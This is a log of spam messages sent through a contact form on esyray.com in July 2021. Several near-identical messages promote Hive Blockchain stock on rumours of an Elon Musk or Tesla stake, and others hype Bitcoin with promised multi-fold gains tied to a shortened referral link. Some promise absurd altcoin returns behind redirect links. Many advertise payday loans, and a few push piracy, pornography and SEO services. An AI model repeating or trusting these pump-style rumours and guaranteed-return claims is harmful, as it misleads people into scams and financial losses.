+++ 2021-07-10 01:28:02 PM -- Email from: Clyde Dutton, -- subject: Elon Musk and this newly listed NASDAQ company in the crypto industry, -- email: dutton.clyde42@gmail.com, -- Message is: Elon Musk is a visionary and he is well knowned to have the midas touch. Anything he tweets or gets involved in, goes up in prices.

Elon Musk caused Bitcoin's price to soar when he tweeted about it.

Proof: https://www.forbes.com/sites/jonathanponciano/2021/06/13/musk-denies-bitcoin-pump-and-dump-and-says-tesla-will-resume-transactions-once-this-mining-goal-is-reached/?sh=17fdcafeaa2a

Elon Musk caused Doge Coin to soar when he tweeted about it.
https://www.news.com.au/finance/money/investing/dogecoin-price-elon-musk-pumps-crypto-with-ceo-tweet/news-story/adb38ab506f84b632992bd8314068003

The most important question everyone has is: &quot;what is next?&quot;

The short answer is a newly listed NASDAQ crypto mining company from Canada.

Rumours have it that Elon Musk or Tesla might have or is going to acquire a stake in this newly listed NASDAQ.

Many are waiting for his &quot;infamous&quot; tweets to send stock price soaring.

With all the talk about going green, this newly listed Bitcoin and Ethereum mining company is a green company that mines bitcoin and ethereum using green energy.

It is currently trading at less than USD$3.50 in NASDAQ, way lower than it's all time high in 2018. And Bitcoin and Ethereum have broken their all time high, making this stock highly undervalued.

This company is Canadian company Hive Blockchain. You can check out their stock here:
https://www.nasdaq.com/market-activity/stocks/hvbtf

Rumours have it that Elon Musk or Tesla has taken a stake in this company which just listed on NASDAQ on 1st July 2021.

https://www.foxbusiness.com/markets/bitcoin-miners-form-council-meeting-elon-musk
https://ca.finance.yahoo.com/news/3-reasons-hive-blockchain-technologies-230044627.html

If you are a long term investor, you can consider buying this stock for the long term.

If you are a short term speculator, you can consider the strategy of buy the rumour and sell the news on HIVE Blockchain stock.

For more on this stock, you can visit the official website here: https://www.hiveblockchain.com/

And do check out what the investor community is saying about HIVE BLOCKCHAIN here in Yahoo: https://finance.yahoo.com/quote/HIVE.V/community?p=HIVE.V

Don't miss out on this golden opporunity!
+++ 2021-07-11 04:59:07 AM -- Email from: Kandace, -- subject: esyray.com, -- email: kandace@esyray.com, -- Message is: 2021 New Telescope Provide You The Clearest Visual Experience

Our Super Zoom Telescope would allow you to do this anywhere with no problem! The unbeatable design lets you carry the telescope anywhere taking up no room at all.

Save 50% OFF with Free Worldwide Shipping.  SHOP NOW today: https://telescope.fun

Cheers, 

Kandace
Contact Us
+++ 2021-07-11 08:07:49 AM -- Email from: Andreapex, -- subject: Warez Music Scene Releases, -- email: c.wolgen@tele2.nl, -- Message is: Hello, 
 
Download Music Scene Releases: http://0daymusic.org/premium.php 
Server's capacity 186 TB Music 
Support for FTP, FTPS, SFTP, HTTP, HTTPS. 
Download Dance, Electro, House, Techno, Trance, Pop, Rock, Rap... 
 
Best regards, 
0day MP3s
+++ 2021-07-11 01:09:29 PM -- Email from: Violette Garvin, -- subject: , -- email: ckhedhirinidhale@billseo.com, -- Message is: Thinking about making some extra cash online? Don't do it until you've read this first: http://bit.ly/how-to-start-an-affiliate-marketing-business
+++ 2021-07-12 08:10:03 AM -- Email from: Diego Mckinney, -- subject: Elon Musk and this newly listed NASDAQ company in the crypto industry, -- email: mckinney.diego@gmail.com, -- Message is: Elon Musk is a visionary and he is well knowned to have the midas touch. Anything he tweets or gets involved in, goes up in prices.

Elon Musk caused Bitcoin's price to soar when he tweeted about it.

Proof: https://www.forbes.com/sites/jonathanponciano/2021/06/13/musk-denies-bitcoin-pump-and-dump-and-says-tesla-will-resume-transactions-once-this-mining-goal-is-reached/?sh=17fdcafeaa2a

Elon Musk caused Doge Coin to soar when he tweeted about it.
https://www.news.com.au/finance/money/investing/dogecoin-price-elon-musk-pumps-crypto-with-ceo-tweet/news-story/adb38ab506f84b632992bd8314068003

The most important question everyone has is: &quot;what is next?&quot;

The short answer is a newly listed NASDAQ crypto mining company from Canada.

Rumours have it that Elon Musk or Tesla might have or is going to acquire a stake in this newly listed NASDAQ.

Many are waiting for his &quot;infamous&quot; tweets to send stock price soaring.

With all the talk about going green, this newly listed Bitcoin and Ethereum mining company is a green company that mines bitcoin and ethereum using green energy.

It is currently trading at less than USD$3.50 in NASDAQ, way lower than it's all time high in 2018. And Bitcoin and Ethereum have broken their all time high, making this stock highly undervalued.

This company is Canadian company Hive Blockchain. You can check out their stock here:
https://www.nasdaq.com/market-activity/stocks/hvbtf

Rumours have it that Elon Musk or Tesla has taken a stake in this company which just listed on NASDAQ on 1st July 2021.

https://www.foxbusiness.com/markets/bitcoin-miners-form-council-meeting-elon-musk
https://ca.finance.yahoo.com/news/3-reasons-hive-blockchain-technologies-230044627.html

If you are a long term investor, you can consider buying this stock for the long term.

If you are a short term speculator, you can consider the strategy of buy the rumour and sell the news on HIVE Blockchain stock.

For more on this stock, you can visit the official website here: https://www.hiveblockchain.com/

And do check out what the investor community is saying about HIVE BLOCKCHAIN here in Yahoo: https://finance.yahoo.com/quote/HIVE.V/community?p=HIVE.V

Don't miss out on this golden opporunity!
+++ 2021-07-12 04:21:02 PM -- Email from: Domitila Sensor, -- subject: Brittany Mei, -- email: SheronKetchum@yahoo.com, -- Message is: Here is a list of 18 free traffic sources that you should be using: http://bit.ly/18freetrafficsources
+++ 2021-07-13 04:43:17 PM -- Email from: Faye Hand, -- subject: , -- email: laok.duhoky4@disdraplo.com, -- Message is: Need more buyers for your website? Read this: http://bit.ly/buyers-to-your-site-now
+++ 2021-07-15 02:05:31 AM -- Email from: Corazon Vaude, -- subject: Elon Musk and this newly listed NASDAQ company in the crypto industry, -- email: corazon.vaude@gmail.com, -- Message is: Elon Musk is a visionary and he is well knowned to have the midas touch. Anything he tweets or gets involved in, goes up in prices.

Elon Musk caused Bitcoin's price to soar when he tweeted about it.

Proof: https://www.forbes.com/sites/jonathanponciano/2021/06/13/musk-denies-bitcoin-pump-and-dump-and-says-tesla-will-resume-transactions-once-this-mining-goal-is-reached/?sh=17fdcafeaa2a

Elon Musk caused Doge Coin to soar when he tweeted about it.
https://www.news.com.au/finance/money/investing/dogecoin-price-elon-musk-pumps-crypto-with-ceo-tweet/news-story/adb38ab506f84b632992bd8314068003

The most important question everyone has is: &quot;what is next?&quot;

The short answer is a newly listed NASDAQ crypto mining company from Canada.

Rumours have it that Elon Musk or Tesla might have or is going to acquire a stake in this newly listed NASDAQ.

Many are waiting for his &quot;infamous&quot; tweets to send stock price soaring.

With all the talk about going green, this newly listed Bitcoin and Ethereum mining company is a green company that mines bitcoin and ethereum using green energy.

It is currently trading at less than USD$3.50 in NASDAQ, way lower than it's all time high in 2018. And Bitcoin and Ethereum have broken their all time high, making this stock highly undervalued.

This company is Canadian company Hive Blockchain. You can check out their stock here:
https://www.nasdaq.com/market-activity/stocks/hvbtf

Rumours have it that Elon Musk or Tesla has taken a stake in this company which just listed on NASDAQ on 1st July 2021.

https://www.foxbusiness.com/markets/bitcoin-miners-form-council-meeting-elon-musk
https://ca.finance.yahoo.com/news/3-reasons-hive-blockchain-technologies-230044627.html

If you are a long term investor, you can consider buying this stock for the long term.

If you are a short term speculator, you can consider the strategy of buy the rumour and sell the news on HIVE Blockchain stock.

For more on this stock, you can visit the official website here: https://www.hiveblockchain.com/

And do check out what the investor community is saying about HIVE BLOCKCHAIN here in Yahoo: https://finance.yahoo.com/quote/HIVE.V/community?p=HIVE.V

Don't miss out on this golden opporunity!
+++ 2021-07-16 01:11:24 PM -- Email from: Tyree Forand, -- subject: Don't miss the Bitcoin Bullrun end of this year, -- email: forand.tyree@hotmail.com, -- Message is: By now most people have heard of Bitcoin.

Unlike traditional stock markets, Bitcoin has its own cycles of ups and downs. There is a model called &quot;Stock to Flow&quot; price predication model by PlanB (an anonymous Dutch hedge fund manager).

Forbes calls this model one of the most accurate price predication model of Bitcoin. https://www.forbes.com/sites/stevenehrlich/2021/04/29/demystifying-bitcoins-remarkably-accurate-price-prediction-model-stock-to-flow/?sh=60d4c376476a

According to this model, Bitcoin can hit a price USD$150,000 to USD$300,000 by Dec 2021 or Jan 2022. You can follow this legend's twitter account here: https://twitter.com/100trillionUSD

Currently Bitcoin trades around USD$30,000, if PlanB is correct, we can expect a 5 to 10 times gain in Bitcoin in the next 6 to 9 months!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-17 01:54:08 AM -- Email from: DavidCax, -- subject: New super offer!, -- email: herthag1983@bk.ru, -- Message is: Hi 
Super offer 2021 https://is.gd/OUL6yh
+++ 2021-07-17 01:55:13 AM -- Email from: Mike Martin, -- subject: affordable monthly SEO plans, -- email: krystynacopl32@gmail.com, -- Message is: Hi 
 
I have just checked  esyray.com for its SEO Trend and saw that your website could use an upgrade. 
 
We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
regards 
Mike Martin
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-07-17 01:28:30 PM -- Email from: Elvera Farnell, -- subject: Don't miss the Bitcoin Bullrun end of this year, -- email: farnell.elvera@googlemail.com, -- Message is: By now most people have heard of Bitcoin.

Unlike traditional stock markets, Bitcoin has its own cycles of ups and downs. There is a model called &quot;Stock to Flow&quot; price predication model by PlanB (an anonymous Dutch hedge fund manager).

Forbes calls this model one of the most accurate price predication model of Bitcoin. https://www.forbes.com/sites/stevenehrlich/2021/04/29/demystifying-bitcoins-remarkably-accurate-price-prediction-model-stock-to-flow/?sh=60d4c376476a

According to this model, Bitcoin can hit a price USD$150,000 to USD$300,000 by Dec 2021 or Jan 2022. You can follow this legend's twitter account here: https://twitter.com/100trillionUSD

Currently Bitcoin trades around USD$30,000, if PlanB is correct, we can expect a 5 to 10 times gain in Bitcoin in the next 6 to 9 months!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-19 04:53:16 AM -- Email from: Anibal Plate, -- subject: Website submitter© has arrived!, -- email: anibal.plate@yahoo.com, -- Message is: Good evening
The quickest way to promote your web site. Just enter your URL. Your competitors employ this service already.
https://best-marketers.com
Best regards,
We offer the most effective IT services you may check on our website for making big money in a small business, still not considering getting clients? Here is a quick, 1-click unsubscribe link: https://best-marketers.com/?unsubscribe=esyray.com
+++ 2021-07-20 03:06:56 AM -- Email from: Regan Corner, -- subject: , -- email: zhakim.medjahed@werkuldino.buzz, -- Message is: This web traffic costs one tenth to 1/100th the cost of Google Adwords and is high quality and targeted specifically for your keywords: https://bit.ly/cheaper-and-better-web-traffic
+++ 2021-07-20 05:03:19 AM -- Email from: Jessica McGowen, -- subject: Don't miss the Bitcoin Bullrun end of this year, -- email: jessica.mcgowen@gmail.com, -- Message is: By now most people have heard of Bitcoin.

Unlike traditional stock markets, Bitcoin has its own cycles of ups and downs. There is a model called &quot;Stock to Flow&quot; price predication model by PlanB (an anonymous Dutch hedge fund manager).

Forbes calls this model one of the most accurate price predication model of Bitcoin. https://www.forbes.com/sites/stevenehrlich/2021/04/29/demystifying-bitcoins-remarkably-accurate-price-prediction-model-stock-to-flow/?sh=60d4c376476a

According to this model, Bitcoin can hit a price USD$150,000 to USD$300,000 by Dec 2021 or Jan 2022. You can follow this legend's twitter account here: https://twitter.com/100trillionUSD

Currently Bitcoin trades around USD$30,000, if PlanB is correct, we can expect a 5 to 10 times gain in Bitcoin in the next 6 to 9 months!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-20 08:08:57 AM -- Email from: Bernt Maes, -- subject: Cold Steel for Hot Girls at Lock-Master.com, -- email: c_ontactreports87495@outlook.hu, -- Message is: 5000+ Quality 3D Metal-Bondage and latex slavery pictures:  https://lock-master.com/ 
Previews:   https://lock-master.com/previews/
+++ 2021-07-20 03:18:57 PM -- Email from: skyreverytug, -- subject: Private jet charter flights cost of hire, -- email: malinoleg91@mail.ru, -- Message is: &lt;a href=https://www.skyrevery.com/destinations/private-jet-london/&gt;London Private Jet Charter &lt;/a&gt;        -  more information on our website &lt;a href=https://skyrevery.com&gt;skyrevery.com&lt;/a&gt; 
&lt;a href=https://skyrevery.com/&gt;Private jet rental&lt;/a&gt; at SkyRevery allows you to use such valuable resource as time most efficiently. 
You are the one who decides where and when your private jet will fly. It is possible to organize and perform a flight between any two civil airports worldwide round the clock. In airports, private jet passengers use special VIP terminals where airport formalities are minimized, and all handling is really fast – you come just 30 minutes before  the estimated time of the departure of the rented private jet. 
When you need &lt;a href=https://skyrevery.com/&gt;private jet charter&lt;/a&gt; now, we can organise your flight with departure in 3 hours from confirmation.
+++ 2021-07-21 12:20:56 AM -- Email from: Online Loans, -- subject: tzeymnkp, -- email: inradiator@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;payday loans in colorado springs&lt;/a&gt;
+++ 2021-07-21 07:31:32 AM -- Email from: Best Payday Loan, -- subject: rnxeouti, -- email: adelia@qtmx.space, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;small loans personal&lt;/a&gt;
+++ 2021-07-21 09:08:17 AM -- Email from: Loans, -- subject: lvkljaaq, -- email: eric0@instamail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;easy payday&lt;/a&gt;
+++ 2021-07-21 12:07:15 PM -- Email from: Reyes Branham, -- subject: Don't miss the Bitcoin Bullrun end of this year, -- email: reyes.branham@gmail.com, -- Message is: By now most people have heard of Bitcoin.

Unlike traditional stock markets, Bitcoin has its own cycles of ups and downs. There is a model called &quot;Stock to Flow&quot; price predication model by PlanB (an anonymous Dutch hedge fund manager).

Forbes calls this model one of the most accurate price predication model of Bitcoin. https://www.forbes.com/sites/stevenehrlich/2021/04/29/demystifying-bitcoins-remarkably-accurate-price-prediction-model-stock-to-flow/?sh=60d4c376476a

According to this model, Bitcoin can hit a price USD$150,000 to USD$300,000 by Dec 2021 or Jan 2022. You can follow this legend's twitter account here: https://twitter.com/100trillionUSD

Currently Bitcoin trades around USD$30,000, if PlanB is correct, we can expect a 5 to 10 times gain in Bitcoin in the next 6 to 9 months!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-21 03:48:04 PM -- Email from: Kathryn Schubert, -- subject: Don't miss the Bitcoin Bullrun end of this year, -- email: kathryn.schubert@gmail.com, -- Message is: By now most people have heard of Bitcoin.

Unlike traditional stock markets, Bitcoin has its own cycles of ups and downs. There is a model called &quot;Stock to Flow&quot; price predication model by PlanB (an anonymous Dutch hedge fund manager).

Forbes calls this model one of the most accurate price predication model of Bitcoin. https://www.forbes.com/sites/stevenehrlich/2021/04/29/demystifying-bitcoins-remarkably-accurate-price-prediction-model-stock-to-flow/?sh=60d4c376476a

According to this model, Bitcoin can hit a price USD$150,000 to USD$300,000 by Dec 2021 or Jan 2022. You can follow this legend's twitter account here: https://twitter.com/100trillionUSD

Currently Bitcoin trades around USD$30,000, if PlanB is correct, we can expect a 5 to 10 times gain in Bitcoin in the next 6 to 9 months!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-21 10:59:32 PM -- Email from: Direct Lender Loans, -- subject: sgmmwpls, -- email: dmasala@qtmx.space, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loan lender&lt;/a&gt;
+++ 2021-07-21 11:59:33 PM -- Email from: Loans For Bad Credit, -- subject: njhitgts, -- email: mesianica51@qtmx.space, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loans for christmas&lt;/a&gt;
+++ 2021-07-22 09:28:19 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-07-22 11:03:59 PM -- Email from: Best Online Loans, -- subject: stqrzdjr, -- email: sandra40@qtmx.space, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;pay day&lt;/a&gt;
+++ 2021-07-23 06:04:33 AM -- Email from: Speedycash, -- subject: tqyhxdxy, -- email: amirsadath@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;installment payments&lt;/a&gt;
+++ 2021-07-23 10:16:19 AM -- Email from: Philipwak, -- subject: Altcoins that will make you a millionaire, -- email: chia03@msn.com, -- Message is: Invest in altcoins $ 900 and get $ 6,000,000 in net income   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc4cmvI&amp;sa=D&amp;Za=Ns&amp;usg=AFQjCNGLe4oHse5AVYu6GyfMgVBr_TRlow   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-07-23 03:29:05 PM -- Email from: Getting A Loan, -- subject: cxwiizdg, -- email: bmnico88@msmx.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;personal loans reviews&lt;/a&gt;
+++ 2021-07-23 04:47:28 PM -- Email from: https://tinysrc.me/go/hg0PJIWng, -- subject: Best offer 2021, -- email: abc037cdsq09@mail.com, -- Message is: You will be pleasantly surprised to learn about our generous offer. 
The link to our offer is valid for only one day https://tinysrc.me/go/hg0PJIWng
+++ 2021-07-24 01:12:15 AM -- Email from: Bad Credit, -- subject: tuhaaywx, -- email: orozco7018@msmx.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;cash advance direct&lt;/a&gt;
+++ 2021-07-24 04:00:42 AM -- Email from: Pay Day Loan, -- subject: sglfbwmd, -- email: davew100au@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;personal loan no credit check&lt;/a&gt;
+++ 2021-07-24 12:44:10 PM -- Email from: Online Loan, -- subject: dilsaeuj, -- email: xinping@jumbox.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;bad credit debt consolidation loans&lt;/a&gt;
+++ 2021-07-24 01:06:29 PM -- Email from: Ola Roby, -- subject: ola.roby@gmail.com, -- email: 5mouafa@polostar.me, -- Message is: Promote your website the easy way without paying huge advertising costs. More info: https://bit.ly/results-marketing
+++ 2021-07-24 04:53:29 PM -- Email from: Online Payday Loans, -- subject: dexqgvli, -- email: bbkearney@instamail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;personal loan bad credit&lt;/a&gt;
+++ 2021-07-24 06:49:47 PM -- Email from: Payday Loans, -- subject: oarptdrq, -- email: akaywalt@romail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;commercial loans&lt;/a&gt;
+++ 2021-07-25 03:16:58 AM -- Email from: https://tinysrc.me/go/hg0PJIWng, -- subject: Best offer 2021, -- email: abc037cdsq09@mail.com, -- Message is: You will be pleasantly surprised to learn about our generous offer. 
The link to our offer is valid for only one day https://tinysrc.me/go/hg0PJIWng
+++ 2021-07-25 03:40:55 AM -- Email from: Eleanor Baltzell, -- subject: The cost of getting backlinks for esyray.com is less than the cost of not doing it., -- email: baltzell.eleanor@yahoo.com, -- Message is: Good morning 
This is the software the competitors use , nor don’t want you to know:
https://geeks-marketing.com/backlinks-generator
Best regards,
We offer the top IT services you may find on our website for making big money in a small business, still not interested in getting new clients? Here is a quick, 1-click unsubscribe link: https://geeks-marketing.com/?unsubscribe=esyray.com
+++ 2021-07-25 10:38:23 AM -- Email from: Ralph Nicklin, -- subject: Don't miss the Bitcoin Bullrun end of this year, -- email: ralph.nicklin@outlook.com, -- Message is: By now most people have heard of Bitcoin.

Unlike traditional stock markets, Bitcoin has its own cycles of ups and downs. There is a model called &quot;Stock to Flow&quot; price predication model by PlanB (an anonymous Dutch hedge fund manager).

Forbes calls this model one of the most accurate price predication model of Bitcoin. https://www.forbes.com/sites/stevenehrlich/2021/04/29/demystifying-bitcoins-remarkably-accurate-price-prediction-model-stock-to-flow/?sh=60d4c376476a

According to this model, Bitcoin can hit a price USD$150,000 to USD$300,000 by Dec 2021 or Jan 2022. You can follow this legend's twitter account here: https://twitter.com/100trillionUSD

Currently Bitcoin trades around USD$30,000, if PlanB is correct, we can expect a 5 to 10 times gain in Bitcoin in the next 6 to 9 months!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-25 04:13:30 PM -- Email from: Loans Online, -- subject: pwsoadqd, -- email: rgreen@romail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;web loan&lt;/a&gt;
+++ 2021-07-25 11:15:23 PM -- Email from: Cameronaward, -- subject: Are you looking for a one night stand?, -- email: glukhin03@mail.ru, -- Message is: Find local girls for one night stands using these free hookup dating sites and apps 
&lt;a href=https://bit.ly/3eRG9jH&gt;Dating apps&lt;/a&gt;
+++ 2021-07-25 11:27:48 PM -- Email from: Andreapex, -- subject: Europe Music, -- email: c.wolgen@tele2.nl, -- Message is: Hello, 
 
Europe Music: https://europesmusic.blogspot.com 
Style: Pop, Rap, Rock, Eurodance, Euro-House, Trance, Techno... 
 
Best regards, Andrea
+++ 2021-07-26 03:07:58 AM -- Email from: Loans Online, -- subject: otjnozyz, -- email: certainedb@qtmx.space, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loans with bad credit&lt;/a&gt;
+++ 2021-07-26 07:24:21 AM -- Email from: Philipwak, -- subject: Buy altcoins for $ 8,000 and sell them for $ 19,000,000, -- email: lilshorrtty83@aol.com, -- Message is: Buy altcoins and get х90000 from investments   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc4i9X0&amp;sa=D&amp;Nw=Cr&amp;usg=AFQjCNE2EmOUFVcE166-vAX00JJWo-a21Q   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-07-26 10:01:15 AM -- Email from: Online Loan, -- subject: nxkfbsja, -- email: laurence@instamail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;where can i get a payday loan&lt;/a&gt;
+++ 2021-07-26 10:18:58 AM -- Email from: Loans, -- subject: abmrvyhm, -- email: gene3ee@jumbox.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;cash advance loan&lt;/a&gt;
+++ 2021-07-26 01:39:35 PM -- Email from: Emery Lempriere, -- subject: Twitter and Amazon are adopting Bitcoin, -- email: emery.lempriere@googlemail.com, -- Message is: Twitter is adopting Bitcoin -&gt; https://techcrunch.com/2021/07/23/daily-crunch-bitcoin-is-a-big-part-of-our-future-says-twitter-ceo-jack-dorsey/

Amazon is also jumping on the Bitcoin bandwagon - &gt;https://www.cnbc.com/2021/07/23/amazon-is-hiring-a-digital-currency-and-blockchain-expert.html

Do not miss this opportunity of the lifetime.

Many people buy bitcoin and other cryptocurrencies when prices are going up, this is the worst thing that you can do. In order to make money, you have to buy low (when others are not going euphoric) and sell high.

The chance to buy bitcoin is NOW.


Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-26 02:25:31 PM -- Email from: Cameronaward, -- subject: Are you looking for a one night stand?, -- email: glukhin03@mail.ru, -- Message is: Find local girls for one night stands using these free hookup dating sites and apps 
&lt;a href=https://bit.ly/3eRG9jH&gt;Dating apps&lt;/a&gt;
+++ 2021-07-26 08:03:54 PM -- Email from: SEO X Press Digital Agency, -- subject: Ultimate SEO Solutions for esyray.com, -- email: karynsolter32@gmail.com, -- Message is: Hello 
 
 
I have just verified your SEO on  esyray.com for  the current search visibility and saw that your website could use an upgrade. 
 
 
We will improve your Ranks organically and safely, using only whitehat methods, 
 
 
If interested, please email us 
 
support@digital-x-press.com 
 
 
regards 
Mike Nelson
 
SEO X Press Digital Agency 
https://www.digital-x-press.com
+++ 2021-07-27 01:23:19 AM -- Email from: Online Loans, -- subject: ldcwswss, -- email: kari@msmx.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;pa payday loans&lt;/a&gt;
+++ 2021-07-27 02:55:22 AM -- Email from: Cash Advance, -- subject: agshfsqd, -- email: ckbriscoe@instamail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;bad credit fast loans&lt;/a&gt;
+++ 2021-07-27 03:06:39 AM -- Email from: Get A Loan, -- subject: ovgqhbwn, -- email: bluejeans@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;need cash now&lt;/a&gt;
+++ 2021-07-27 02:10:03 PM -- Email from: Easy Payday Loan, -- subject: kiaievjw, -- email: pablocarlos61@jumbox.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;cash advance loans&lt;/a&gt;
+++ 2021-07-27 05:49:21 PM -- Email from: Quick Loan, -- subject: rldxhkmc, -- email: dansoccer8@jumbox.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loans in austin&lt;/a&gt;
